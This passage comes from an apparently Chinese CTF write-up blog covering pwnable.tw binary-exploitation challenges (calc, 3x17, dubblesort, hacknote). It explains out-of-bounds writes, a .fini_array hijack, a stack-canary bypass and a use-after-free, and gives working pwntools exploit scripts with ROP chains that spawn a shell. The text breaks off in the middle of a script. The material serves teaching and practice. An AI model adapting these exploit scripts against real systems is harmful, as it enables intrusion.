{</span><br><span class="line">    <span class="keyword">if</span> ( op == <span class="string">'-'</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">list</span>[*<span class="built_in">list</span> - <span class="number">1</span>] -= <span class="built_in">list</span>[*<span class="built_in">list</span>];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( op == <span class="string">'/'</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">list</span>[*<span class="built_in">list</span> - <span class="number">1</span>] /= <span class="built_in">list</span>[*<span class="built_in">list</span>];</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( op == <span class="string">'*'</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">list</span>[*<span class="built_in">list</span> - <span class="number">1</span>] *= <span class="built_in">list</span>[*<span class="built_in">list</span>];</span><br><span class="line">  }</span><br><span class="line">  result = <span class="built_in">list</span>;</span><br><span class="line">  --*<span class="built_in">list</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>其中*list存放数字的个数，在eval中作为索引进行运算</p>
<p>其实程序越复杂，越难找到漏洞</p>
<p>程序看起来很自然，并没什么危险的操作，当我们输入1+2时，结构是这样的</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span>[<span class="number">2</span>] = {<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>}</span><br><span class="line">op[<span class="number">0</span>] = {<span class="string">"+"</span>}</span><br></pre></td></tr></tbody></table></figure>

<p>执行list[*list - 1] += list[*list]时 ==&gt; list[1] = list[1] + list[2] = 3</p>
<p>此时list[2] = {2,3,2}; 此时pirntf就是list[1] </p>
<p>但是，如果我们只输入+1，list[1] = {1,1}，那么就会变成这样list[*list - 1] += list[*list] ==&gt; list[0] = list[1] + list[0] = 1+1 =2；此时printf的结果就是list[0]，(list[0]需要自减1)</p>
<p>由于缺少相关检查，所以会存在这种结果,如果+x时，就会输出list[x-1]，当x超出result长度时即可读取到栈上其他的数据</p>
<p>测试如下，数组越界读</p>
<p><img src="https://i.loli.net/2020/12/11/BVZ7r59JXxTgD1y.png"></p>
<p>再考虑另一种情况+x+y  </p>
<p>list[0] = x+1</p>
<p>list[x+1] = y</p>
<p>list[*list - 1] += list[*list] ==&gt; list[x] = list[x] + list[x+1] </p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v9 &gt; <span class="number">0</span> )</span><br><span class="line">{</span><br><span class="line">    count = (*<span class="built_in">list</span>)++;                      <span class="comment">// list[0]存放数字个数</span></span><br><span class="line">    <span class="built_in">list</span>[count + <span class="number">1</span>] = v9;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>所以说通过这种操作可以进行数组越界写</p>
<p>例如：+361+1 ==&gt; list[362] = 1;</p>
<p><img src="https://image.3001.net/images/20170418/14925270013675.png"></p>
<p>原理图如上，系统调用execve函数来getshell</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'i386'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># /bin/sh and gadget</span></span><br><span class="line">str_bin = <span class="number">0x6e69622f</span></span><br><span class="line">str_sh = <span class="number">0x0068732f</span></span><br><span class="line">pop_eax = <span class="number">0x0805c34b</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x080701d0</span></span><br><span class="line">int_80 = <span class="number">0x08049a21</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak ebp</span></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">"+360"</span>)</span><br><span class="line">ebp = <span class="built_in">int</span>(io.recv())-<span class="number">0x20</span></span><br><span class="line">binsh_addr = ebp+<span class="number">8</span>*<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># attack</span></span><br><span class="line">ROP = [pop_eax,<span class="number">11</span>,pop_edx_ecx_ebx,<span class="number">0</span>,<span class="number">0</span>,binsh_addr,int_80,str_bin,str_sh]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">361</span>,<span class="number">370</span>):</span><br><span class="line">	num = i - <span class="number">361</span></span><br><span class="line">	io.sendline(<span class="string">"+"</span>+<span class="built_in">str</span>(i))</span><br><span class="line">	tmp = <span class="built_in">int</span>(io.recvline())</span><br><span class="line">	<span class="keyword">if</span> tmp&lt;ROP[num]:</span><br><span class="line">		io.sendline(<span class="string">"+"</span>+<span class="built_in">str</span>(i)+<span class="string">"+"</span>+<span class="built_in">str</span>(ROP[num]-tmp))</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		io.sendline(<span class="string">"+"</span>+<span class="built_in">str</span>(i)+<span class="string">"-"</span>+<span class="built_in">str</span>(tmp-ROP[num]))</span><br><span class="line">	io.recvline()</span><br><span class="line"></span><br><span class="line">io.sendline()</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<h2 id="0x04-3x17"><a href="#0x04-3x17" class="headerlink" title="0x04 3x17"></a>0x04 3x17</h2><p>静态编译的二进制文件，并且是去除符号表，使得程序可读性大大降低，看一下主函数</p>
<p>发现程序有很多系统调用，所以其实看汇编会更有助于理解，由于篇幅问题就不放汇编代码了</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_401B6D</span><span class="params">(__int64 a1, <span class="keyword">char</span> *a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);         <span class="comment">//canary</span></span><br><span class="line">  result = (<span class="keyword">unsigned</span> __int8)++byte_4B9330;</span><br><span class="line">  <span class="keyword">if</span> ( byte_4B9330 == <span class="number">1</span> )            <span class="comment">//输入条件判断</span></span><br><span class="line">  {</span><br><span class="line">    sub_446EC0(<span class="number">1u</span>, <span class="string">"addr:"</span>, <span class="number">5uLL</span>);   <span class="comment">//sys_write_addr</span></span><br><span class="line">    sub_446E20(<span class="number">0</span>, &amp;buf, <span class="number">0x18</span>uLL);    <span class="comment">//sys_read</span></span><br><span class="line">    sub_40EE70((__int64)&amp;buf);       <span class="comment">//将输入的字符串转换为对应的16进制</span></span><br><span class="line">    v5 = (<span class="keyword">char</span> *)v4;</span><br><span class="line">    sub_446EC0(<span class="number">1u</span>, <span class="string">"data:"</span>, <span class="number">5uLL</span>);   <span class="comment">//sys_write_addr</span></span><br><span class="line">    sub_446E20(<span class="number">0</span>, v5, <span class="number">0x18</span>uLL);      <span class="comment">//sys_read</span></span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v7 )</span><br><span class="line">    sub_44A3E0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>其中<code>sub_40EE70</code>函数很复杂，没读懂，但是通过动调还是能够发现它的功能。</p>
<p>函数之前：</p>
<p><img src="https://i.loli.net/2020/11/24/zhKsp5XuP2I3Q1Z.png" alt="image-20201124163242159"></p>
<p>运行过后：</p>
<p><img src="https://i.loli.net/2020/11/24/rSitcBuT1fgQpLn.png" alt="image-20201124163309940"></p>
<p>注意rax寄存器的变化，很容易发现它是将输入的字符串转化成整形变为16进制数</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.12</span> (default, Oct  <span class="number">5</span> <span class="number">2020</span>, <span class="number">13</span>:<span class="number">56</span>:01) </span><br><span class="line">[GCC <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">hex</span>(<span class="number">123123</span>)</span><br><span class="line"><span class="number">0x1e0f3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></tbody></table></figure>

<p>所以程序逻辑很清楚了，就是向你输入的地址处进行写操作。目标就是通过地址任意写漏洞来getshll。</p>
<p>我们都知道__libc_start_main函数</p>
<blockquote>
<p><strong>__libc_start_main( main, argc, argv, __libc_csu_init, __libc_csu_fini, edx, top of stack)</strong></p>
<p>init: main调用前的初始化工作<br>fini: main结束后的收尾工作<br>rtld_fini: 和动态加载有关的收尾工作</p>
</blockquote>
<p>程序只能写一次地址，又由于是静态编译，可用函数很少，所以可以利用该函数进行条件绕过</p>
<p>这题__libc_csu_fini中有两个.fini_array，所以我们可以改.fini_array[1]为 main函数，.fini_array[0]改为__libc_csu_fini，这样就会无限运行main函数，就像这种结构：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main --&gt;  __libc_csu_fini --&gt; fini_array[<span class="number">1</span>] --&gt; fini_array[<span class="number">0</span>]</span><br></pre></td></tr></tbody></table></figure>

<p>当++byte_4B9330不断增大到一定值后会发生溢出再次变为1，所以我们就可以实现无限写地址。</p>
<p>这是start程序入口，下面作了注释，要注意64位程序传参</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">start           proc near </span><br><span class="line">; __unwind {</span><br><span class="line">                <span class="keyword">xor</span>     ebp, ebp</span><br><span class="line">                mov     r9, rdx</span><br><span class="line">                pop     rsi</span><br><span class="line">                mov     rdx, rsp</span><br><span class="line">                <span class="keyword">and</span>     rsp, <span class="number">0F</span>FFFFFFFFFFFFFF0h</span><br><span class="line">                push    rax</span><br><span class="line">                push    rsp</span><br><span class="line">                mov     r8, offset sub_402960   <span class="comment">//__libc_csu_fini</span></span><br><span class="line">                mov     rcx, offset loc_4028D0  <span class="comment">//__libc_csu_init</span></span><br><span class="line">                mov     rdi, offset sub_401B6D  <span class="comment">//main</span></span><br><span class="line">                db      <span class="number">67</span>h</span><br><span class="line">                call    sub_401EB0              <span class="comment">//__libc_start_main</span></span><br><span class="line">                hlt</span><br><span class="line">} <span class="comment">// starts at 401A50</span></span><br></pre></td></tr></tbody></table></figure>

<p>学习参考源码<a target="_blank" rel="noopener" href="https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/csu/elf-init.c">glibc/csu/elf-init.c</a>，</p>
<p>IDA里的__libc_csu_fini函数，可以看到<code>call qword ptr [rbp+rbx*8+0]</code>就是调用fini_array函数，</p>
<p><img src="https://i.loli.net/2020/11/24/YVSvmNZ8WwgnJlb.png" alt="image-20201124174758392"></p>
<p>当我们在call之后如果能执行leave_ret，那么之后在销毁栈帧的过程中，rsp会被变到0x4b100，即ret后就可以劫持ip寄存器到这，那么就可以在这里构造rop，从而getshell。</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./3x17'</span>)</span><br><span class="line"><span class="comment">#io = remote("chall.pwnable.tw",10105)</span></span><br><span class="line">io = elf.process()</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x471db5</span> <span class="comment">#syscall</span></span><br><span class="line">pop_rax = <span class="number">0x41e4af</span></span><br><span class="line">pop_rdx = <span class="number">0x446e35</span></span><br><span class="line">pop_rsi = <span class="number">0x406c30</span></span><br><span class="line">pop_rdi = <span class="number">0x401696</span></span><br><span class="line">bin_sh = <span class="number">0x4B41a0</span></span><br><span class="line">fini_array = <span class="number">0x4B40F0</span></span><br><span class="line">main_addr = <span class="number">0x401B6D</span></span><br><span class="line">libc_csu_fini = <span class="number">0x402960</span></span><br><span class="line">leave_ret = <span class="number">0x401C4B</span></span><br><span class="line"></span><br><span class="line">esp = <span class="number">0x4B4100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_addr</span>(<span class="params">addr,data</span>):</span></span><br><span class="line">	io.recv()</span><br><span class="line">	io.send(<span class="built_in">str</span>(addr))</span><br><span class="line">	io.recv()</span><br><span class="line">	io.send(data)</span><br><span class="line"></span><br><span class="line">write_addr(fini_array,p64(libc_csu_fini) + p64(main_addr)) <span class="comment"># 0 , 1</span></span><br><span class="line"><span class="comment">#execve('/bin/sh',0,0)</span></span><br><span class="line">write_addr(bin_sh,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">write_addr(esp,p64(pop_rax))</span><br><span class="line">write_addr(esp+<span class="number">8</span>,p64(<span class="number">0x3b</span>))</span><br><span class="line">write_addr(esp+<span class="number">16</span>,p64(pop_rdi))</span><br><span class="line">write_addr(esp+<span class="number">24</span>,p64(bin_sh))</span><br><span class="line">write_addr(esp+<span class="number">32</span>,p64(pop_rdx))</span><br><span class="line">write_addr(esp+<span class="number">40</span>,p64(<span class="number">0</span>))</span><br><span class="line">write_addr(esp+<span class="number">48</span>,p64(pop_rsi))</span><br><span class="line">write_addr(esp+<span class="number">56</span>,p64(<span class="number">0</span>))</span><br><span class="line">write_addr(esp+<span class="number">64</span>,p64(syscall))</span><br><span class="line">write_addr(fini_array,p64(leave_ret))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="0x05-dubblesort"><a href="#0x05-dubblesort" class="headerlink" title="0x05 dubblesort"></a>0x05 dubblesort</h2><p>32位程序，保护全开</p>
<p>本题的考点很新奇，值得好好研究一下</p>
<p>这是冒泡排序的逻辑，每次循环将最大值放在数组的最后，然后按序输出</p>
<p>但是由于arry数组并没有检查边界，所以可以构造足够多的数，造成栈溢出</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">dubblesort</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *arry, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *i; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// et1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// [esp+1Ch] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Processing......"</span>);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( len != <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    v3 = len - <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = &amp;arry[len - <span class="number">1</span>]; ; --i )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">-1</span> )</span><br><span class="line">      {</span><br><span class="line">        v6 = arry;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        {</span><br><span class="line">          v2 = *v6;</span><br><span class="line">          v5 = v6[<span class="number">1</span>];</span><br><span class="line">          <span class="keyword">if</span> ( *v6 &gt; v5 )</span><br><span class="line">          {</span><br><span class="line">            *v6 = v5;</span><br><span class="line">            v6[<span class="number">1</span>] = v2;</span><br><span class="line">          }</span><br><span class="line">          ++v6;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">while</span> ( i != v6 );</span><br><span class="line">        <span class="keyword">if</span> ( !v3 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      }</span><br><span class="line">      --v3;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  v8 = __readgsdword(<span class="number">0x14</span>u); <span class="comment">//canary</span></span><br><span class="line">  result = v8 ^ v9;</span><br><span class="line">  <span class="keyword">if</span> ( v8 != v9 )</span><br><span class="line">    sub_BA0(v3, v2);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>漏洞点在read时末尾未添加\x00截断，导致printf可以泄露出libc基址</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">init();</span><br><span class="line">  __printf_chk(<span class="number">1</span>, (<span class="keyword">int</span>)<span class="string">"What your name :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;name, <span class="number">0x40</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1</span>, (<span class="keyword">int</span>)<span class="string">"Hello %s,How many numbers do you what to sort :"</span>);</span><br><span class="line">  __isoc99_scanf((<span class="keyword">int</span>)<span class="string">"%u"</span>, (<span class="keyword">int</span>)&amp;count);</span><br></pre></td></tr></tbody></table></figure>

<p>之后的scanf处就可以进行栈溢出了</p>
<p>而本题难点在于如何绕过canary，由于数组越界，根据你的输入，在排序之后canary也会发生相应改变，为了保证canary的值和位置不发生变化，必须要保证我们的输入有效且合法，</p>
<p>scanf函数接收的数据格式为无符号整型（%u），有没有什么字符可以既让scanf认为它是合法字符，同时又不会修改栈上的数据呢？查阅资料后，发现“+”和“-”可以达到此目的，所以在canary处输入“+”或“-”即可绕过</p>
<p># 如果不知道无符号整型在内存中的存储形式，可以自己写段代码调试一下</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> s[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i&lt;<span class="number">10</span>;i++){</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%u"</span>,&amp;s[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%u\n"</span>,s[i]);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>那么思路很清晰了，其余的工作就是找偏移了，通过gdb动调即可解决</p>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = remote('chall.pwnable.tw',10101)</span></span><br><span class="line"><span class="comment"># p = process('./dubblesort')</span></span><br><span class="line">p = process(<span class="string">"./dubblesort"</span>)</span><br><span class="line"><span class="comment"># libc = ELF('./libc_32.so.6')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">24</span></span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc_addr = u32(p.recv()[<span class="number">30</span>:<span class="number">34</span>])-<span class="number">0xa</span></span><br><span class="line">libcbase_addr = libc_addr - <span class="number">0x1b0000</span>     <span class="comment">#remote</span></span><br><span class="line"><span class="comment"># libcbase_addr = libc_addr - 0x1b3000   #local</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">sys = libcbase_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libcbase_addr + libc.search(<span class="string">'/bin/sh'</span>).<span class="built_in">next</span>()</span><br><span class="line">p.sendline(<span class="string">'35'</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">    p.recv()</span><br><span class="line">p.sendline(<span class="string">'+'</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(sys))</span><br><span class="line">    p.recv()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(binsh))</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>



<h2 id="0x06-hacknote"><a href="#0x06-hacknote" class="headerlink" title="0x06 hacknote"></a>0x06 hacknote</h2><p>32位堆，漏洞点在于delete函数存在uaf</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ptr[v1] )</span><br><span class="line">{</span><br><span class="line">  <span class="built_in">free</span>(*(ptr[v1] + <span class="number">1</span>));</span><br><span class="line">  <span class="built_in">free</span>(ptr[v1]);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>而ptr[0]存放函数指针(puts)，所以思路是利用uaf将puts的指针改为system函数的地址</p>
<p>难点在于本地和靶机的libc版本存在差异，需要动调来找偏移</p>
<p>写两种利用方法</p>
<h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><p>通过unsortedbin来泄露main_arena，从而泄露出libc基址</p>
<p>然后通过申请0x8大小的堆块来修改ptr指针，然而通过测试onegadget打不通，所以改为system</p>
<p>由于限制四个字节，且需要主要system参数截断，所以可选择<code>||</code>，<code>;</code> + <code>sh</code>，<code>$0</code>都可以</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level='debug'</span></span><br><span class="line">elf=ELF(<span class="string">"./hacknote"</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc-2.23.so'</span>)</span><br><span class="line"><span class="comment"># libc = 